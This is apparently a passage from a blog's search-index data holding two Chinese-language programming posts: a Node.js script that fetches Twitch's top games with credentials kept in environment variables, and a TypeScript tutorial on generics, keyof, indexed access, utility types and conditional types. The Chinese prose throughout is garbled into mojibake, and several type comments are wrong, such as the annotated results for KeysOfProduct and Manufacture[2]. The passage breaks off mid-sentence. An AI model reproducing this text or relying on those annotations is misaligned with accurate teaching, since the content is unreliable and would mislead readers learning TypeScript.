æ¥ä¸‹ä¾†å°±ç°¡å–®ç´€éŒ„ä¸€ä¸‹ï¼Œä¸å¤šåšè§£èªªã€‚ å‚™è¨»ï¼šé€™è£¡æŠŠ access_token è·Ÿ client_id éƒ½è—åœ¨ç’°å¢ƒè®Šæ•¸è£¡äº†ï¼Œè©³ç´°å¯ä»¥åƒè€ƒé€™è£¡ 1234567891011121314151617181920212223242526272829303132333435// è¼‰å…¥ dotenvï¼ˆå–å¾—ç’°å¢ƒè®Šæ•¸ï¼‰require('dotenv').config()// ç™¼é€ request çš„æ¨¡çµ„const request = require('request')// è³‡æ–™æ•¸é‡const count = 20request({ method: 'GET', url: `https://api.twitch.tv/helix/games/top?first=${count}`, // æˆæ¬Šè·Ÿé©—è­‰ header headers: { // token çš„æ ¼å¼ä¸€å®šè¦æ˜¯ã€ŒBearer + ' ' + tokenã€`(ä¸€å®šè¦å¤§å¯«) \"authorization\": process.env.ACCESS_TOKEN, \"Client-ID\": process.env.CLIENT_ID }}, (error, response, body) =&gt; { if(error) { console.log('oops! ç™¼ç”Ÿäº†ä¸€äº›éŒ¯èª¤ï¼') console.log(error) return } if(response.statusCode &gt;= 200 &amp;&amp; response.statusCode &lt; 400) { console.log('statusCode:', response.statusCode) // è§£æè³‡æ–™ const res = JSON.parse(body) // å°å‡ºå…§å®¹ res.data.forEach(item =&gt; { console.log(Number(item.id), item.name) }) } else { console.log('è«‹æ±‚å¤±æ•—') console.log(JSON.parse(body)) }}) è¼¸å‡ºçµæœï¼š 123456789101112131415161718192021statusCode: 200509658 Just Chatting21779 League of Legends491931 Escape from Tarkov516575 VALORANT511224 Apex Legends32982 Grand Theft Auto V29595 Dota 2498566 Slots512710 Call of Duty: Warzone33214 Fortnite513143 Teamfight Tactics26936 Music138585 Hearthstone1869092879 FIFA 22491487 Dead by Daylight27471 Minecraft513181 Genshin Impact32399 Counter-Strike: Global Offensive490100 LOST ARK509660 Art é¡Œå¤–è©±ï¼ŒLeague of Legends çœŸçš„æ˜¯æ­·ä¹…ä¸è¡°é˜¿ã€‚","link":"/2022/01/07/twitch-api/"},{"title":"TypeScriptï¼å„ç¨®é€²éšä½¿ç”¨çš„æŠ€å·§","text":"æ²’æœ‰ TypeScript åšä¸åˆ°çš„ï¼Œåªæœ‰ä½ æƒ³ä¸åˆ°çš„ã€‚ æ³›å‹æ­é… extendsç¯„ä¾‹ä¸€1234function getFirstElement&lt;T extends number&gt;(arr: T[]): T { const [first] = arr return first} extends åœ¨é€™é‚Šçš„æ„æ€æ˜¯æŒ‡ã€ŒT è‡³å°‘è¦æ»¿è¶³ number é€™å€‹ typeã€ï¼Œè€Œ arr çš„ type æ˜¯ T[]ï¼ŒæŠŠå…©å€‹çµ„åˆèµ·ä¾†çš„æ„æ€å°±æ˜¯ï¼š å‚³å…¥çš„å€¼å¿…é ˆæ˜¯ã€Œé™£åˆ—ã€ï¼Œä¸”é™£åˆ—ä¸­çš„å…ƒç´ å¿…é ˆç‚ºã€Œnumberã€ã€‚ æ‰€ä»¥ç”¨èµ·ä¾†æœƒæ˜¯é€™æ¨£ï¼š 1getFirstElement([1, 2, 3, 4]) å¦‚æœå‚³å…¥ä¸æ˜¯ number çš„ type æ™‚å°±æœƒç·¨è­¯éŒ¯èª¤ï¼š å¦‚æœæƒ³è¦è®“ T ä¹Ÿæ”¯æ´ string çš„è©±å¯ä»¥æ”¹æˆé€™æ¨£å­ï¼š 1234function getFirstElement&lt;T extends number | string&gt;(arr: T[]): T { const [first] = arr return first} é€™æ¨£çš„æ„æ€å°±æœƒè®Šæˆï¼š å‚³å…¥çš„å€¼å¿…é ˆæ˜¯ã€Œé™£åˆ—ã€ï¼Œä¸”é™£åˆ—ä¸­çš„å…ƒç´ å¿…é ˆç‚ºã€Œnumberã€æˆ–ã€Œstringã€ã€‚ æ‰€ä»¥ç¾åœ¨å‚³å…¥ string é™£åˆ—çš„è©±å°±ä¸æœƒå‡ºéŒ¯äº†ï¼š 12getFirstElement([1, 2, 3, 4]) // correct âœ…getFirstElement(['A', 'B', 'C']) // correct âœ… ç¯„ä¾‹äºŒå‡è¨­ç¾åœ¨æœ‰ä¸€å€‹å°å‡ºåå­—çš„ functionï¼Œé•·é€™æ¨£ï¼š 123function logPersonName(person) { console.log(`${person.firstName} ${person.lastName}`)} ç„¶è€Œç•¶æˆ‘å€‘å°é€™å€‹ function å®šç¾© type æ™‚æœƒç¢°åˆ°ä¸€å€‹å•é¡Œï¼Œå› ç‚ºé€šå¸¸ person å¯èƒ½æœƒæœ‰å„å¼å„æ¨£çš„å±¬æ€§ï¼Œåƒé€™æ¨£ï¼š 1234567891011type Person1 = { firstName: string lastName: string age: number}type Person2 = { firstName: string lastName: string gender: number} æ‰€ä»¥å¦‚æœè¦é‡å°ä¸åŒçš„ person å»å®šç¾© type æ™‚ï¼Œå°±å¾—å„åˆ¥å¯«ä¸€å€‹ function ä¾†è™•ç†ï¼š 12345678// çµ¦ Person1 ç”¨çš„ functionfunction logPersonName1(person: Person1): void { console.log(`${person.firstName} ${person.lastName}`)}// çµ¦ Person2 ç”¨çš„ functionfunction logPersonName2(person: Person2): void { console.log(`${person.firstName} ${person.lastName}`)} çœ‹åˆ°é€™é‚Šæ‡‰è©²æœƒè¦ºå¾—é€™æ˜¯å¾ˆéº»ç…©çš„åšæ³•å§ï¼Ÿæ‰€ä»¥é€™æ™‚å€™è°æ˜çš„ä½ å°±æœƒæƒ³èªªã€Œé˜¿ï¼Œæˆ‘å¯ä»¥ç”¨æ³›å‹ä¾†è™•ç†å§ï¼ã€ï¼Œæ¥è‘—å¯«å‡ºé€™æ¨£çš„æ±è¥¿ï¼š 123function logPersonName&lt;T&gt;(person: T): void { console.log(`${person.firstName} ${person.lastName}`)} ç„¶å¾Œå°±æœƒçœ‹åˆ°é€™æ®µéŒ¯èª¤è¨Šæ¯ï¼š é€™è£¡æœ‰ç‰¹åˆ¥æŠŠ any çµ¦æ¡†èµ·ä¾†ï¼Œæ˜¯å› ç‚ºé€™å°±æ˜¯ä¸»è¦åŸå› ã€‚TS çš„æ„æ€æ˜¯èªªï¼š æˆ‘çŸ¥é“ä½ çµ¦äº†ä¸€å€‹æ³›å‹ï¼Œä½†æ˜¯é€™å€‹æ³›å‹çš„ç¯„åœå¯¦åœ¨æ˜¯å¤ªã€Œå»£ã€æ³›ã€äº†ã€ï¼Œå› æ­¤æˆ‘ç„¡æ³•ä¿è­‰ firstName å’Œ lastName æœƒå‡ºç¾åœ¨ person ä¸­ã€‚ ç‚ºäº†è®“ TS ç¢ºä¿ person è‡³å°‘æœƒæœ‰ firstName å’Œ lastName é€™å…©å€‹å±¬æ€§ï¼Œæˆ‘å€‘å¯ä»¥ç”¨ extends æ”¹å¯«æˆé€™æ¨£å­ï¼š 123456789type Person = { firstName: string lastName: string}// T è‡³å°‘è¦å‡ºç¾ Person ä¸­çš„å±¬æ€§ï¼Œæ‰€ä»¥ person è‡³å°‘æœƒæœ‰ firstName å’Œ lastNamefunction logPersonName&lt;T extends Person&gt;(person: T): void { console.log(`${person.firstName} ${person.lastName}`)} é€™æ¨£å­å°±å¯ä»¥ç¢ºä¿ firstName å’Œ lastName å­˜åœ¨ï¼Œä½†åˆä¸æœƒåƒ…é™æ–¼ç‰¹å®šå¹¾å€‹ person æ‰èƒ½ä½¿ç”¨é€™å€‹ function äº†ï¼š 123456789101112// correct âœ…logPersonName({ firstName: 'Pea', lastName: 'Nu', age: 20})// correct âœ…logPersonName({ firstName: 'Pea', lastName: 'Nu', gender: 'man'}) ç¯„ä¾‹ä¸‰å¦‚æœè¦å° Type Alias æœ¬èº«ä¾†é™åˆ¶æ³›å‹çš„è©±ï¼Œå¯ä»¥é€™æ¨£åšï¼š 1234567// è‡³å°‘è¦å‡ºç¾çš„å±¬æ€§type BasePerson = { firstName: string lastName: string}// åŠ ä¸Šé™åˆ¶çš„æ³›å‹type GenericPerson&lt;T extends BasePerson&gt; = T ç¾åœ¨é€™å€‹ GenericPerson çš„ç”¨é€”å°±æ˜¯ï¼š çµ¦æˆ‘ä¸€å€‹ type(T)ï¼Œæˆ‘æœƒå›å‚³ä½ ä¸€å€‹æ–°çš„ typeã€‚å‚³é€²ä¾†çš„ type å¯ä»¥åŒ…å«ä»»ä½•å±¬æ€§ï¼Œä½†å‰ææ˜¯è‡³å°‘è¦æœ‰ firstName å’Œ lastName å±¬æ€§ï¼Œå¦å‰‡ä¸çµ¦éã€‚ å¯¦éš›ç”¨èµ·ä¾†æœƒåƒé€™æ¨£ï¼š 123456789type MyPerson = { firstName: string lastName: string age: 20 gender: 'man'}function logPersonName(person: GenericPerson&lt;MyPerson&gt;): void { console.log(`${person.firstName} ${person.lastName}`)} å¦‚æœç¾åœ¨æŠŠå…¶ä¸­ä¸€å€‹å±¬æ€§æ‹¿æ‰çš„è©±ï¼Œå°±æœƒçœ‹åˆ°éŒ¯èª¤è¨Šæ¯ï¼š é€™é‚Šæœƒçœ‹åˆ°å…©å€‹éŒ¯èª¤ã€‚ ç¬¬ä¸€å€‹æ˜¯ person.lastNameï¼Œé€™æ˜¯å› ç‚º MyPerson ä¸­ä¸¦æ²’æœ‰ lastNameï¼Œæ‰€ä»¥è‡ªç„¶ä¸è©²å»å­˜å–é€™å€‹å±¬æ€§ã€‚ ç¬¬äºŒå€‹æ˜¯ GenericPerson&lt;MyPerson&gt;ï¼Œå› ç‚º GenericPerson ä¸­çš„ T æœ‰ç”¨ extends ä¾†é™åˆ¶å‚³å…¥çš„ T è‡³å°‘è¦æœ‰ firstName å’Œ lastName å…©å€‹å±¬æ€§ï¼Œè€Œ MyPerson ä¸­æ²’æœ‰ lastNameï¼Œæ‰€ä»¥å°±æœƒå‡ºéŒ¯ã€‚ keyof çš„ä½¿ç”¨å¦‚æœä½ æœ‰ä¸€å€‹ type é•·é€™æ¨£ï¼š 1234type Person = { firstName: string lastName: string} é€™æ™‚å€™ä½ åªæƒ³è¦ Person ä¸­çš„ key çš„è©±å¯ä»¥ç”¨ keyof ä¾†èƒå–ï¼š 123456type Person = { firstName: string lastName: string}// 'firstName' | 'lastName'type PersonKey = keyof Person é€™é‚Šä½ å¯èƒ½æœƒæœ‰ä¸€å€‹ç–‘æƒ‘æ˜¯ç‚ºä»€éº¼ä¸æœƒé¡¯ç¤º 'firstName' | 'lastName' è€Œæ˜¯ keyof Personï¼Ÿé€™æ˜¯å› ç‚ºåœ¨å®šç¾©ä¸€å€‹ç‰©ä»¶çš„ type æ™‚å®ƒçš„ key æœ‰å¯èƒ½æœƒæ˜¯ stringã€number æˆ– symbol é€™ä¸‰ç¨®é¡åˆ¥ï¼š é€™æ¨£å­ TS å°±ç„¡æ³•ç¢ºä¿å‹åˆ¥æ˜¯ä»€éº¼ï¼Œæ‰€ä»¥æ‰ç„¡æ³•ç›´æ¥é¡¯ç¤º 'firstName' | 'lastName'ã€‚ è¦è§£æ±ºé€™å€‹å•é¡Œçš„è©±å¯ä»¥æ­é… &amp; string ä¾†è®“ TS çŸ¥é“é€™é‚Šçš„ key æ˜¯åªæœƒæ˜¯ string å°±è¡Œäº†ï¼š Indexd accessingå¦‚æœä½ æœ‰ä¸€å€‹ type é•·é€™æ¨£ï¼š 123456type Person = { firstName: string lastName: string age: number isMarried: boolean} é€™æ™‚å€™ä½ æƒ³æŠŠ firsName çš„ typeï¼ˆstringï¼‰ å–å‡ºä¾†çš„è©±ï¼Œå¯ä»¥é€™æ¨£åšï¼š é€éé€™ç¨®æ–¹å¼ç”¢ç”Ÿçš„ type å°±ç¨±ç‚ºã€ŒIndexd accessingã€ã€‚ å¦‚æœæƒ³è¦å–å‡ºã€Œå¤šå€‹å€¼ã€çš„è©±å¯ä»¥é€™æ¨£å¯«ï¼š æ¥ä¸‹ä¾†ä½ è¦å•èªªã€Œå¦‚æœæˆ‘æƒ³è¦æ‰€æœ‰çš„å€¼å‘¢ã€ï¼Œå°å—ï¼Ÿåœ¨è¬›è§£ç­”å‰å¯ä»¥å…ˆæƒ³æƒ³çœ‹å‰›å‰›çš„é‚è¼¯ï¼Œç•¶æˆ‘å€‘æƒ³è¦å–å‡º firstName çš„ type æ™‚æœƒå¯« Person['firstName']ï¼Œæƒ³è¦ firstName å’Œ age æ™‚æœƒå¯« Person['firstName' | 'age']ï¼Œâ€¦ä»¥æ­¤é¡æ¨ã€‚ ä¹Ÿå°±æ˜¯èªªï¼Œåªè¦æŠŠæ‰€æœ‰ Person çš„ key éƒ½æ”¾åˆ° [] è£¡é¢çš„è©±å°±å¯ä»¥æ‹¿åˆ°æ‰€æœ‰å±¬æ€§çš„ typeã€‚ æœ‰å¯Ÿè¦ºåˆ°åœ¨æš—ç¤ºä»€éº¼å—ï¼Ÿå…¶å¯¦å°±æ˜¯å‰é¢çš„ keyofï¼Œåªè¦å¯«æˆé€™æ¨£å°±å¯ä»¥å–å‡ºæ‰€æœ‰å±¬æ€§çš„ type äº†ï¼š generic &amp; keyof &amp; indexed access ç¶œåˆç·´ç¿’é€™é‚Šæ˜¯æ¸¬è©¦ä½ å°å‰é¢çš„æ±è¥¿æœ‰æ²’æœ‰ç†Ÿæ‚‰ï¼Œåªè¦æ‡‚é€™ä¸‰æ¨£æ±è¥¿å¾Œå°±èƒ½åšå‡ºè »æ–¹ä¾¿çš„æ±è¥¿ã€‚ é€™è£¡è¦å¯¦ä½œçš„æ˜¯ä¸€å€‹ç”¨ä¾†å–å‡ºç‰©ä»¶å±¬æ€§å€¼çš„ functionï¼Œç”¨èµ·ä¾†æœƒåƒé€™æ¨£ï¼š 123456789const person = { firstName: 'Pea', lastName: 'Nu', age: 24}getObjectValue(person, 'firstName') // 'Pea'getObjectValue(person, 'lastName') // 'Nu'getObjectValue(person, 'age') // 24 ä½†æˆ‘å¸Œæœ›é™¤äº†åŸºæœ¬çš„åŠŸèƒ½ä»¥å¤–ï¼Œå®ƒé‚„è¦æœ‰åº•ä¸‹çš„åŠŸèƒ½ï¼š 1. é¿å…å‚³å…¥ä¸æ­£ç¢ºçš„ keyï¼š 2. å¯ä»¥è‡ªå‹•é¡¯ç¤ºèƒ½å‚³å…¥å“ªäº›å€¼ï¼š é€™åŠŸèƒ½å…¶å¯¦é‚„è »æ–¹ä¾¿çš„å§ï¼Ÿä¾†çœ‹çœ‹é€™æ˜¯æ€éº¼åšå‡ºä¾†çš„ã€‚ é¦–å…ˆé€™å€‹ function åŸæœ¬æ‡‰è©²æ˜¯é•·é€™æ¨£å­ï¼š 123function getObjectValue(obj: any, key: any) { return obj[key]} ä¸€é–‹å§‹å¯ä»¥å…ˆä¸ç”¨è€ƒæ…®æ³›å‹çš„éƒ¨åˆ†ï¼Œæˆ‘å€‘å…ˆåšç°¡å–®ä¸€é»çš„ç‰ˆæœ¬å°±å¥½ã€‚ å¦‚æœåªæ˜¯å–®ç´”æƒ³æŠŠ obj è·Ÿ key é™åˆ¶åœ¨ä¸€å®šæŸå€‹ç¯„åœçš„è©±ï¼Œæˆ‘å€‘åªè¦å»ºç«‹ä¸€å€‹å¯¦éš›çš„ type ä¾†é™åˆ¶å³å¯ï¼Œåƒé€™æ¨£ï¼š 1234567891011// å»ºç«‹ä¸€å€‹ Person typetype Person = { firstName: string lastName: string age: number}// obj é™åˆ¶ç‚º Personï¼Œkey é™åˆ¶ç‚º Person ä¸­çš„æ‰€æœ‰å±¬æ€§function getObjectValue(obj: Person, key: keyof Person) { return obj[key]} é€™æ¨£å­å…¶å¯¦å°±èƒ½å¯¦ç¾ä¸Šé¢çš„å…©ç¨®åŠŸèƒ½äº†ï¼Œç¾åœ¨ç¬¬äºŒå€‹åƒæ•¸åªèƒ½å‚³å…¥ firstNameã€lastNameã€age ï¼Œä¸¦ä¸”æœ‰è‡ªå‹•æç¤ºçš„åŠŸèƒ½ã€‚ å•é¡Œåœ¨æ–¼ä»Šå¤©å¦‚æœæƒ³å‚³å…¥çš„ obj ä¸æ˜¯ Person é€™å€‹ type çš„è©±å°±æ²’è¾¦æ³•ç”¨äº†ï¼š ï¼ˆæ”¹å‚³å…¥å¦ä¸€å€‹å«åš car çš„ç‰©ä»¶ï¼‰ é›–ç„¶å¯ä»¥å¹«æ¯ä¸€å€‹ç‰©ä»¶å»ºç«‹ä¸€å€‹ä¸åŒçš„ function ä¾†è™•ç†ï¼Œä½†é‚£æ¨£å­æœ‰é»ä¸åˆ‡å¯¦éš›ï¼Œç•¢ç«Ÿé‚è¼¯æ˜æ˜éƒ½ä¸€æ¨£ã€‚ é€™æ™‚å€™æ³›å‹å°±å¾ˆå¥½ç”¨äº†ï¼Œæ—¢ç„¶ obj æœƒéš¨è‘—å‚³å…¥çš„å€¼è€Œæ”¹è®Šï¼Œæˆ‘å€‘å°±æŠŠæœƒã€Œæ”¹è®Šã€çš„åœ°æ–¹è®Šæˆæ³›å‹å°±å¥½äº†ï¼š 12345678910111213141516171819202122232425type Person = { firstName: string lastName: string age: number}// æ”¹æˆ Tï¼ˆæ³›å‹ï¼‰function getObjectValue&lt;T&gt;(obj: T, key: keyof T) { return obj[key]}const person = { firstName: 'Pea', lastName: 'Nu', age: 24}const car = { brand: 'Toyota', type: 'SUV', id: 'CTY-1268'}getObjectValue(car, 'brand')getObjectValue(person, 'firstName') é€™æ¨£å°±ä¸æœƒå‡ºç¾éŒ¯èª¤è¨Šæ¯äº†ï¼š åšåˆ°é€™é‚Šå…¶å¯¦å°±å®Œæˆä¸€é–‹å§‹æƒ³è¦çš„åŠŸèƒ½äº†ï¼Œæˆ‘å€‘å¯ä»¥å‚³å…¥ä»»ä½•ç‰©ä»¶ï¼Œä¸¦ä¸”åªèƒ½å‚³å…¥å°æ‡‰çš„ keyï¼Œä¹Ÿèƒ½æœ‰æç¤ºçš„åŠŸèƒ½ã€‚ å¹« key åŠ ä¸Šé™åˆ¶å¦‚æœç¾åœ¨æƒ³è¦æŠŠå¯ä»¥å‚³å…¥çš„ key åŠ ä¸Šé™åˆ¶ï¼Œåƒé€™æ¨£å­ï¼š 1234// åªèƒ½å‚³å…¥ 'age' é€™å€‹ keygetObjectValue&lt;Person, 'age'&gt;(person, 'age')// å‚³å…¥ 'age' ä»¥å¤–çš„ key æœƒå‡ºéŒ¯getObjectValue&lt;Person, 'age'&gt;(person, 'firstName') é€™é‚Šçµ¦å¹¾å€‹æç¤ºï¼Œå¯ä»¥å…ˆè‡ªå·±æ€è€ƒçœ‹çœ‹å¾Œå†å¾€ä¸‹çœ‹è§£ç­”ï¼š éœ€è¦ç¬¬äºŒå€‹æ³›å‹ï¼Œç”¨ä¾†ç•¶ä½œ key çš„ type ç¬¬äºŒå€‹æ³›å‹å¿…é ˆè¦æœ‰ä¸€å®šçš„é™åˆ¶ï¼Œå¦å‰‡æœƒå› ç‚ºå¤ªå»£æ³›è€Œå‡ºå•é¡Œ 1234// åŠ å…¥ç¬¬äºŒå€‹æ³›å‹ Uï¼Œä¸¦ä¸”é™åˆ¶ U åªèƒ½å‚³å…¥ T çš„ keyfunction getObjectValue&lt;T, U extends keyof T&gt;(obj: T, key: U): T[U] { return obj[key]} ç¨å¾®è§£é‡‹ä¸€ä¸‹é€™é‚Šçš„æµç¨‹ï¼š å…ˆæŠŠ key çš„ type è®Šæˆ Uï¼Œè®“ key è®Šæˆæ˜¯å¯ä»¥è‡ªè¨‚çš„ type åˆ©ç”¨ extends æŠŠ U çš„ç¯„åœé™åˆ¶åœ¨ T çš„ keyï¼Œä»¥å…å‚³å…¥ä¸å­˜åœ¨ T èº«ä¸Šçš„ key æœ€å¾Œå¯ä»¥æ³¨æ„åˆ°å›å‚³å€¼çš„éƒ¨åˆ†ï¼šT[U]ã€‚ å› ç‚ºæˆ‘å€‘æœ€å¾Œæœƒå›å‚³çš„æ˜¯ã€ŒT é€™å€‹ç‰©ä»¶çš„ valueã€ï¼Œè€Œå¦‚æœè¦è¡¨ç¤ºé€™å€‹ value çš„ type çš„è©±æœƒç”¨ T[...] ä¾†è¡¨ç¤ºï¼Œä¾‹å¦‚ T['firstName'] æœƒæ˜¯ stringï¼ŒT['age'] æœƒæ˜¯ numberã€‚åªæ˜¯ç¾åœ¨æˆ‘å€‘æŠŠ [...] çš„éƒ¨åˆ†ä¹Ÿè®Šæˆæ˜¯æ³›å‹äº†ï¼Œæ‰€ä»¥å°±æœƒè®Šæˆ T[U]ã€‚ é€™ä¸€æ®µå¯èƒ½æœ‰é»æŠ½è±¡ï¼Œå»ºè­°å¯ä»¥å›æ†¶ä¸€ä¸‹ä¹‹å‰çš„ç¯„ä¾‹ä¸¦ç·´ç¿’çœ‹çœ‹æœƒæ¯”è¼ƒå¥½ç†è§£ä¸€é»ã€‚ Utility Typeåœ¨å¯«å°ˆæ¡ˆçš„æ™‚å€™æˆ‘å€‘é€šå¸¸æœƒæœ‰ä¸€ç¨® function æ˜¯ã€ŒæŠŠæŸå€‹å€¼ä¸Ÿé€²å»ï¼Œå†è¼¸å‡ºæˆæƒ³è¦çš„çµæœã€ï¼Œé€™ç¨®æ±è¥¿å°±ç¨±ç‚ºã€ŒUtilityã€ã€‚è€Œé€™ç¨®è§€å¿µä¹Ÿå¯ä»¥å¥—ç”¨åˆ° TS ä¸Šï¼Œåªæ˜¯æœƒè®Šæˆã€ŒæŠŠæŸå€‹ type ä¸Ÿé€²å»ï¼Œå†è¼¸å‡ºæˆå¦å¤–ä¸€å€‹ typeã€ã€‚ åº•ä¸‹é™„ä¸Šå¹¾å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼Œåªè¦å‰é¢çš„è§€å¿µæœ‰å¼„æ‡‚æ‡‰è©²å°±ä¸æœƒè¦ºå¾—è¤‡é›œï¼š 123456789101112131415161718192021222324// sampletype Manufacture = 'Apple' | 'Google' | 'Samsung' | 'Sony'type Product = { name: string price: number manufacture: Manufacture isLaunched: boolean}// utilitytype OrNull&lt;T&gt; = T | nulltype OneOrMany&lt;T&gt; = T | T[]type OneOrManyOrNull&lt;T&gt; = T | T[] | nulltype Keys&lt;T&gt; = keyof T &amp; stringtype Values&lt;T&gt; = T[keyof T]type PickObj&lt;T, U extends keyof T&gt; = T[U]// outputtype ProductOrNull = OrNull&lt;Product&gt; // Product | nulltype ManufactureOrManufactures = OneOrMany&lt;Manufacture&gt; // 'Apple | ['Apple']type ManufactureOrManufacturesOrNull = OneOrManyOrNull&lt;Manufacture&gt; // 'Apple | ['Apple'] | nulltype KeysOfProduct = Keys&lt;Product&gt; // 'Apple' | 'Google' | 'Samsung' | 'Sony'type ValuesOfProduct = Values&lt;Product&gt; // string | number | booleantype PickedProduct = PickObj&lt;Product, 'manufacture'&gt; // \"Apple\" | \"Google\" | \"Samsung\" | \"Sony\" æ¯å€‹ utility æœƒè¼¸å‡ºçš„çµæœï¼š OrNull æŸå€‹ type æˆ–æ˜¯ null OneOrMany å–®ä¸€æˆ–é™£åˆ—å½¢å¼çš„ type OneOrManyNull å–®ä¸€æˆ–é™£åˆ—å½¢å¼æˆ– null çš„ type Keys åªå–å‡º key çš„ type Values åªå–å‡ºå±¬æ€§å€¼çš„ type PickObj å–å‡ºæŒ‡å®šå±¬æ€§å€¼çš„ type Conditional Typesåœ¨ TS ä¸­å¯ä»¥åƒ JS ä¸€æ¨£ç”¨ä¸‰å…ƒé‹ç®—å­ä¾†è¨ˆç®—å‡ºæœ€å¾Œçš„å€¼ï¼Œåªæ˜¯ä¸€å€‹æ˜¯å›å‚³ã€Œå€¼ã€ï¼Œä¸€å€‹æ˜¯å›å‚³ã€Œå‹åˆ¥ï¼ˆtypeï¼‰ã€ã€‚ ä¾†çœ‹å€‹ç°¡å–®çš„ç¯„ä¾‹ï¼š 1234// SomeType1 çš„å‹åˆ¥æ˜¯ 'PeaNu' é€™å€‹å­—ä¸²type SomeType1 = 'PeaNu'// å¦‚æœ SomeType1 æ˜¯ string çš„å­é›†åˆï¼Œå›å‚³å‹åˆ¥ trueï¼Œåä¹‹å‰‡å›å‚³ falsetype NewType1 = SomeType1 extends string ? true : false å‡ºä¾†çš„çµæœæœƒæ˜¯é€™æ¨£ï¼š é€™æ®µå¦‚æœé‚„è¨˜å¾— extends çš„ç”¨é€”æ‡‰è©²å°±ä¸é›£ç†è§£ï¼Œæ„æ€æ˜¯ã€Œå¦‚æœ SomeType1 çš„å‹åˆ¥æœ‰å‡ºç¾åœ¨ string çš„å­é›†åˆè£¡ï¼Œå°±å›å‚³ true ä¾†ç•¶ä½œæ–°çš„å‹åˆ¥ï¼Œåä¹‹å‰‡å›å‚³ falseã€‚ è€Œ PeaNu é›–ç„¶æ˜¯ä¸€å€‹å›ºå®šçš„å­—ä¸²å€¼ï¼Œä½†å®ƒç•¶ç„¶ç¬¦åˆ string é€™å€‹æ¢ä»¶ï¼Œæ‰€ä»¥æœ€å¾Œçš„å‹åˆ¥å°±æœƒæ˜¯ trueã€‚ Flattenæ¥è‘—æ˜¯ TS å®˜æ–¹æä¾›çš„ä¸€å€‹ç¯„ä¾‹ï¼š è·Ÿå‰›å‰›çš„ç¯„ä¾‹å·®ä¸å¤šï¼Œä½†å¯èƒ½æœƒæœ‰ç–‘æƒ‘çš„åœ°æ–¹æ˜¯ T[number]ï¼Œé€™å€‹å…ˆä¸ç”¨çš„å¿ƒï¼Œå¾Œé¢æœƒå†å›ä¾†è§£é‡‹ã€‚ æŠŠé€™æ®µå‹åˆ¥ç¿»æˆç™½è©±çš„æ„æ€æ˜¯ã€Œå¦‚æœå‚³é€²ä¾†çš„ T æ˜¯é™£åˆ—å‹åˆ¥ï¼Œå°±å›å‚³ T[number]ï¼Œå¦å‰‡ç›´æ¥å›å‚³åŸæœ¬çš„ Tã€‚ æ‰€ä»¥æˆ‘å€‘å¯ä»¥ä¾†åšå€‹æ¸¬è©¦ï¼š 1234type Flatten&lt;T&gt; = T extends any[] ? T[number] : Ttype Manufacture = 'Apple' | 'Google' | 'Samsung' | 'Sony'// æŠŠ T å‚³å…¥ä¸€å€‹éé™£åˆ—çš„å‹åˆ¥type FlattenManufacture = Flatten&lt;Manufacture&gt; çµæœå°±æœƒè·Ÿå‰›å‰›é æœŸçš„ä¸€æ¨£ï¼Œæœƒæ˜¯ T åŸæœ¬çš„å‹åˆ¥ï¼š é‚£å¦‚æœç¾åœ¨æ”¹å‚³å…¥é™£åˆ—å‹åˆ¥å‘¢ï¼Ÿ 1234type Flatten&lt;T&gt; = T extends any[] ? T[number] : Ttype Manufacture = 'Apple' | 'Google' | 'Samsung' | 'Sony'[]// æŠŠ T å‚³å…¥ä¸€å€‹é™£åˆ—çš„å‹åˆ¥type FlattenManufacture = Flatten&lt;Manufacture&gt; æœƒç™¼ç¾é™£åˆ—è¢«ã€Œæ‹¿æ‰äº†ã€ï¼š é€™å€‹å…¶å¯¦å°±æ˜¯ Flatten çš„çœŸæ­£çš„ç”¨é€”ï¼šã€ŒæŠŠé™£åˆ—ä¸­çš„å…ƒç´ å‹åˆ¥æŠ½å‡ºä¾†ã€ã€‚ ä¸å¤ªæ‡‚çš„è©±å¯ä»¥å†ä¾†çœ‹å€‹ä¾‹å­ï¼š 1234type Flatten&lt;T&gt; = T extends any[] ? T[number] : T// ä¸€æ¨£å‚³å…¥é™£åˆ—å‹åˆ¥type Manufacture = ['a', false, null]type FlattenManufacture = Flatten&lt;Manufacture&gt; è¼¸å‡ºçµæœï¼š é—œæ–¼ T[number]ææ‡‚äº†ä¸Šé¢çš„ Conditional Type å¾Œï¼Œç¾åœ¨å›ä¾†è«‡ä¸€ä¸‹ T[number] çš„éƒ¨åˆ†ã€‚å‰›å‰›ä½ å¯èƒ½æœƒæœ‰ç–‘æƒ‘çš„åœ°æ–¹æ˜¯ã€Œç‚ºä»€éº¼ç”¨äº† T[number] å°±å¯ä»¥æŠŠé™£åˆ—å…ƒç´ çš„å‹åˆ¥æ‹¿å‡ºä¾†ï¼Ÿã€ é€™æ˜¯å› ç‚ºç•¶ä¸€å€‹å‹åˆ¥æ˜¯é™£åˆ—æ™‚ï¼Œä»–çš„ index å€¼ä¸€å®šæœƒæ˜¯ã€Œæ•¸å­—ã€ï¼Œæ‰€ä»¥æˆ‘å€‘å¯ä»¥é€éé€™äº›æ•¸å­—ä¾†å–å‡ºå°æ‡‰çš„å…ƒç´ ï¼š 12345type Manufacture = ['a', false, null]type Manufacture1 = Manufacture[0] // 'a'type Manufacture2 = Manufacture[1] // falsetype Manufacture3 = Manufacture[2] // 'a' ä½†ç•¶æˆ‘å€‘æƒ³è¦æŒ‡å‘é™£åˆ—ä¸­çš„æ‰€æœ‰å…ƒç´ æ™‚ä¸æœƒæ˜¯ä¸€å€‹ç‰¹å®šçš„æ•¸å­—ï¼Œæ‰€ä»¥é€™æ™‚å€™åªè¦æŠŠ index æŒ‡å®šç‚º number å³å¯ï¼š 1type ManufactureAll = Manufacture[number] // false | \"a\" | null åˆ†é…å¾‹çš„æ¦‚å¿µæˆ‘å€‘å…ˆä¾†çœ‹ä¸€å€‹å®˜æ–¹æä¾›çš„ utilityï¼šExtractï¼Œå®ƒçš„åŸå§‹ç¢¼å¦‚ä¸‹ï¼š æ„æ€æ˜¯èªªã€Œç•¶ T ç‚º U çš„å­é›†åˆæ™‚ï¼Œå›å‚³ T çš„å‹åˆ¥ï¼Œåä¹‹å›å‚³ neverã€ã€‚ å¯¦éš›ä½¿ç”¨èµ·ä¾†æœƒåƒé€™æ¨£å­ï¼š 12345type Collection = 'a' | 'b'type T1 = Extract&lt;'a' | 'b' | 'c', Collection&gt; // 'a' | 'b'type T2 = Extract&lt;'a' | 'b' | 'c' | 'd', Collection&gt; // 'a' | 'b'type T3 = Extract&lt;'b' | 'c' | 'd' | 'e', Collection&gt; // 'b' å…ˆä¾†çœ‹ T1ï¼Œèƒ½çœ‹åˆ° a å’Œ b å› 